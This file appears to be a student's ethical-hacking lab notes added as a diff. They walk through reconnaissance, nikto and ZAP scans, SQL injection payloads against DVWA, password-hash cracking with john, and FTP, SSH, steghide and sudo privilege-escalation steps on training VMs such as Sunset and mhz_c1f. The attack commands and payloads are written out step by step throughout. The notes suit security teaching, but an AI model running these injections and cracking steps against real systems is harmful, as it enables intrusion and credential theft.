@@ -1,0 +1,192 @@
+PROGRAM 1
+-----------
+Nw Recon
+
+Perform Nmap scan to identify open ports, hosts, etc
+use amass to identify sub-domain and meta-data
+
+Open cmd prompt and type
+ipconfig to get ip details of system (default gateway)
+Copy the ip addr and perform nmap scan to it
+
+nmap -A 192.168.0.1
+nmap -sV -O -sS 192.168.0.1
+
+Now perform amass
+
+use cmd : amass enum -d <domain name>
+ex : amass enum -d microsoft.com
+
+
+Program 2
+----------
+Run nikto against web application to find out-dated server details
+
+Scan a url against nikto command
+(note the url is being scanned by nikto should be a working url)
+
+cmd: nikto -h <url>
+
+systectl start apache2
+systemctl start mysql
+
+goto 127.0.0.1/DVWA/login.php
+login admin,password
+
+nikto -h http://127.0.0.1/DVWA/
+
+There are many scanned path that can be accessed so verify them
+
+goto /DVWA/config/
+/DVWA/database/
+
+juice-shop
+nikto -h http://127.0.0.1:42000/
+
+PROGRAM 3
+-----------
+Run Both Sunset and Kali with network bridged adapter
+run netdiscover in kali
+nmap -A <ip>
+
+login as username : anonymous,Password : (press enter)
+we get 2 ports 21/ftp and 22/ssh
+we take port 21 as target
+
+we get into ftp server by ftp <ip>
+
+ftp ip
+ls
+get backup
+exit
+
+cat backup
+
+open nano file and paste the sunset encrypted password
+nano hash.txt
+john hash.txt
+
+john --show hash.txt
+
+username: sunset
+pass:cheer14
+
+PROGRAM 4
+---------
+
+systemctl start apache2
+systemctl start mysql
+systemctl status apache2
+systemctl status mysql
+
+go to 127.0.0.1/DVWA/
+DVWA security > Low > SQL Injection
+
+SQL injecction
+User ID :1,2,3
+'or 1=1#
+
+'union select table_name,null from information_schema.tables#
+
+'union select user,password from users#
+
+nano pass.txt
+
+save hashed passwrds
+
+Ctrl+O Enter Ctrl+x
+john --format=raw-MD5 pass.txt
+john pass.txt
+
+or crackstation.net
+
+
+PROGRAM 6
+-----------
+Open dvwa web page
+select dvwa security to "LOW"
+go to sql injecion and typethe following cmd:
+'UNION select user,password from users#
+
+systemctl start apache2
+systemctl start mysql
+
+Copy the first name and passwords
+Open nano and paste the hash password
+once the file is saved type - john <filename.txt>
+
+nano pass.txt
+
+john --format=raw-MD5 pass.txt
+
+
+PROGRAM 8
+------------
+
+Open mhz_c1f on VM
+come to kali terminal and perform netdiscover
+copy address of pcs
+perform nmap on the ipaddr
+
+nmap -p- -A <ipadr>
+
+We fint that port 22 and port 80 are open
+
+We explore port 80 by typing ipaddr in firefox
+
+Use dirb to brute-force directory
+cmd: dirb: http//192.168.1.8/ -x .txt
+
+goto ip/notes.txt
+goto firefox and go to ip/remb.txt
+
+cmd : ssh first_stage@192.168.1.8
+ls
+cat user.txt
+
+cd /home
+ls
+cd mhz_c1f
+ls
+cd paintings
+ls
+(we have successfully connected to vm using ssh)
+
+Data exfiltration
+Open new tab and type
+mkdir mhz
+cd mhz
+scp first_stage@192.168.1.8:/home/mhz_c1f/Paintings/* .
+type the following 
+
+steghide extract -sf (address of spinning the wool.jpeg)
+Enter passphrase (no password)
+cat remb2.txt
+copy selection (mhz_c1f:@ec1f)
+
+Privilege Escalation
+go back ssh server and type the cmd
+su mhz_c1f ->password : mhz_c1f:@ec1f
+id
+sudo su ->password : mhz_c1f:@ec1f
+ls
+ls -la
+cat .root.txt
+password : mhz_c1f:@ec1
+
+
+
+PROGRAM 9
+-----------
+
+sudo apt install zaproxy
+Open zaproxy
+
+
+Terminal : juice-shop
+go to 127.0.0.1:42000
+
+In Automated Scan, Paste the url of juice shop
+Then press Attack
+
+
